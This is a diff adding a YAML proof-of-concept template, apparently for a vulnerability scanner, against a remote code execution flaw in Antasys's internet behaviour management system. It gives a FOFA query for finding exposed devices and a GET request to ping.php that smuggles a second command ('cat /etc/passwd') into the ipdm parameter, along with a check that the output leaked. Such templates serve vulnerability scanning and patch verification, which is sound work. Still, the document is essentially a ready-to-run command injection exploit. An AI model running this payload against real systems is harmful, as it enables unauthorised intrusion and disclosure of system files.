@@ -1,0 +1,15 @@
+id: poc-yaml-antasys-ibms-rce
+info:
+  name: 汉塔科技 上网行为管理系统 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 上网行为管理系统
+  fofa: body="Antasys"
+requests:
+- method: GET
+  path: /dgn/dgn_tools/ping.php?ipdm=127.0.0.1;cat%20/etc/passwd;&ps=64&cnt=1
+  expression: status_code == 200 && contains(body,"PING") && contains(body,"root:")
+    && contains(body,"/bin") && contains(body,"<br>")
+variables: {}
+transport: http
